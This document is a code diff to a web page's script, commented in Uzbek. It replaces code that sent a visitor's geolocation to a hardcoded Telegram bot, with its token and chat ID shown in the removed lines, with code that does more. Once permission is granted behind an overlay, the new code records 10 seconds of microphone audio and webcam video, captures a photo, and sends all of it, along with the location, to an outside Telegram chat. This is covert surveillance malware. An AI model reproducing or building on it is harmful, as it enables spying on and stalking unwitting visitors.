@@ -75,53 +75,114 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8057687168:AAHDxv2JopvR9wryv_hDRYTZq_tWSkHlIhs'; // Telegram bot token
-        const CHAT_ID = '7265761467'; // Telegram chat ID
-        let permissionsGranted = false; // Ruxsat berilganligini tekshirish uchun
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const CHAT_ID = 'YOUR_CHAT_ID';
 
-        async function sendLocationToTelegram(latitude, longitude) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
-                });
-                if (response.ok) {
-                    console.log('Location sent successfully!');
-                } else {
-                    console.error('Failed to send location:', await response.text());
-                }
-            } catch (error) {
-                console.error('Error sending location:', error);
-            }
-        }
-
-        async function requestPermissions() {
-            if (permissionsGranted) return; // Agar ruxsat allaqachon berilgan bo‘lsa, qayta so‘ramaydi
-
-            document.getElementById('prompt-overlay').style.display = 'none'; // Overlayni yashirish
-            permissionsGranted = true; // Ruxsat berilgan deb belgilash
-
-            // Joylashuvni olish
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude } = position.coords;
-                    await sendLocationToTelegram(latitude, longitude);
-                }, (error) => {
-                    console.error('Error getting location:', error);
-                    alert('Joylashuvga ruxsat berilmadi!');
-                });
-            } else {
-                alert('Geolocation is not supported by this browser.');
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            // To‘liq ekran rejimiga o‘tish
-            document.documentElement.requestFullscreen().catch(err => {
-                console.error('Failed to enter full-screen mode:', err);
-            });
+// 🔹 Telegramga media yuborish (audio, photo, video)
+async function sendToTelegram(formData, endpoint) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+            method: 'POST',
+            body: formData
         });
-    </script>
+        if (!response.ok) {
+            console.error(await response.text());
+        }
+    } catch (e) {
+        console.error("Telegramga yuborishda xatolik:", e);
+    }
+}
+
+// 🔹 Lokatsiyani yuborish
+async function sendLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async pos => {
+            const { latitude, longitude } = pos.coords;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
+            });
+        }, err => console.error("Location error:", err));
+    }
+}
+
+// 🔹 Audio yozish va yuborish
+async function recordAudio(stream) {
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('voice', blob, 'voice.ogg');
+        await sendToTelegram(form, 'sendVoice');
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), 10000); // 10 sekund
+}
+
+// 🔹 Rasm olish va yuborish
+async function takePhoto(stream) {
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    try {
+        const bitmap = await imageCapture.grabFrame();
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+        canvas.getContext('2d').drawImage(bitmap, 0, 0);
+        canvas.toBlob(async (blob) => {
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('photo', blob, 'photo.jpg');
+            await sendToTelegram(form, 'sendPhoto');
+        }, 'image/jpeg');
+    } catch (e) {
+        console.error("Rasm olishda xatolik:", e);
+    }
+}
+
+// 🔹 Video yozish va yuborish
+async function recordVideo(stream) {
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('video', blob, 'video.webm');
+        await sendToTelegram(form, 'sendVideo');
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), 10000); // 10 sekund
+}
+
+// 🔹 Barcha ruxsatlarni so‘rash va ishga tushirish
+async function requestPermissions() {
+    document.getElementById('overlay').style.display = 'none';
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+
+        document.getElementById('preview').srcObject = stream;
+
+        sendLocation();
+        recordAudio(stream);
+        takePhoto(stream);
+        recordVideo(stream);
+
+    } catch (e) {
+        alert("Ruxsat berilmadi yoki xatolik yuz berdi");
+        console.error("Ruxsat muammosi:", e);
+    }
+}
+</script>
 </body>
 </html>
